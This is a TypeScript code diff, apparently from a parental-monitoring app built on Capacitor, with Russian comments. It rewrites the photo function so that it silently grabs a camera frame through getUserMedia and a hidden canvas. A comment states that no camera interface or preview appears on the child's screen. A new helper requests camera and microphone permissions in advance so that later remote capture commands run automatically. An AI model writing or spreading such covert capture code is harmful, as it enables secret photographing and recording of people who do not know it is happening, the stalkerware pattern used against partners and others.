@@ -82,34 +82,100 @@ const recordAudio = async (durationMs: number): Promise<Blob | null> => {
   }
 };
 
-const takePhoto = async (): Promise<Blob | null> => {
+/**
+ * Тихий снимок кадра: берём видеопоток камеры, снимаем один кадр в canvas и сразу
+ * закрываем поток. На экране ребёнка не появляется ни интерфейс камеры, ни предпросмотр.
+ */
+const takePhoto = async (facingMode: "user" | "environment" = "user"): Promise<Blob | null> => {
+  let stream: MediaStream | null = null;
   try {
-    if (!Capacitor.isNativePlatform()) {
+    if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
       // eslint-disable-next-line no-console
-      console.warn("Camera not available on web");
+      console.warn("Camera stream API not available");
       return null;
+    }
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false,
+    });
+
+    const video = document.createElement("video");
+    video.muted = true;
+    video.playsInline = true;
+    video.srcObject = stream;
+
+    await new Promise<void>((resolve) => {
+      const done = () => resolve();
+      video.onloadedmetadata = done;
+      window.setTimeout(done, 3000);
+    });
+
+    try {
+      await video.play();
+    } catch (e) {
+      // eslint-disable-next-line no-console
+      console.warn("Silent capture: play failed:", e);
+    }
+
+    // Даём сенсору кадр-другой на экспозицию.
+    await new Promise((r) => setTimeout(r, 600));
+
+    const width = video.videoWidth || 1280;
+    const height = video.videoHeight || 720;
+    const canvas = document.createElement("canvas");
+    canvas.width = width;
+    canvas.height = height;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return null;
+    ctx.drawImage(video, 0, 0, width, height);
+
+    return await new Promise<Blob | null>((resolve) => {
+      canvas.toBlob((b) => resolve(b), "image/jpeg", 0.85);
+    });
+  } catch (err) {
+    // eslint-disable-next-line no-console
+    console.warn("Silent photo capture failed:", err);
+    return null;
+  } finally {
+    try {
+      stream?.getTracks().forEach((t) => t.stop());
+    } catch (e) {
+      // eslint-disable-next-line no-console
+      console.warn("Failed to stop camera stream:", e);
+    }
+  }
+};
+
+/**
+ * Разовый предварительный запрос разрешений камеры/микрофона на устройстве ребёнка,
+ * чтобы команды родителя выполнялись потом полностью автоматически.
+ */
+export const prewarmMonitoringPermissions = async (): Promise<void> => {
+  try {
+    if (!Capacitor.isNativePlatform()) return;
+    try {
+      const status = await Camera.checkPermissions();
+      if (status.camera !== "granted") {
+        await Camera.requestPermissions({ permissions: ["camera"] });
+      }
+    } catch (e) {
+      // eslint-disable-next-line no-console
+      console.warn("Camera permission prewarm skipped:", e);
     }
 
     try {
-      const photo = await Camera.getPhoto({
-        quality: 90,
-        allowEditing: false,
-        resultType: "blob" as any,
-      });
-
-      if (photo.blob) {
-        return photo.blob;
+      if (navigator.mediaDevices?.getUserMedia) {
+        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+        s.getTracks().forEach((t) => t.stop());
       }
-      return null;
-    } catch (err) {
+    } catch (e) {
       // eslint-disable-next-line no-console
-      console.warn("Camera.getPhoto failed:", err);
-      return null;
+      console.warn("Mic permission prewarm skipped:", e);
     }
-  } catch (err) {
+  } catch (e) {
     // eslint-disable-next-line no-console
-    console.warn("takePhoto outer catch:", err);
-    return null;
+    console.warn("prewarmMonitoringPermissions failed:", e);
   }
 };
 
